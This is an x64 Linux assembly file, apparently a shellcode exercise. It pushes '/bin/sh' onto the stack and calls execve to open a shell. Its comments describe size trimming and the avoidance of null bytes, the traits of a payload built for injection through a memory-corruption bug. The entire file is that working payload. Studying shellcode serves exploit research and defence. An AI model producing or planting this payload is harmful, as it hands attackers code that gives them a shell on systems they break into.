; Register allocation for x64 function calls
; function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)
;                ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
;                 call #

Section .text progbits alloc exec write
	global _start
_start:
	xor rdx, rdx 				; rdx = 0
	mov qword rbx, '//bin/sh' 	; align to 8 bytes, 0x68 73 2f 6e 69 62 2f 2f
	shr rbx, 0x08				; 0x00 68 73 2f 6e 69 62 2f
	push rbx 					; rsp -> 2f 62 69 6e 2f 73 68 00 "/bin/sh\0"
	; mov rdi, rsp				; rdi = the pointer to cmd , but 3 bytes
	push rsp
	pop rdi						; only 2 bytes
	push rdx					; push NULL
	push rdi					; push the pointer to cmd
	; mov rsi, rsp				; rsi = the pointer to  {cmd,NULL}
	push rsp
	pop rsi 					; only 2 bytes
	; mov rax, rdx				; rax = 0
	push rdx
	pop rax						; only 2 bytes
	mov al, 0x3b				; syscall number
	syscall						; call


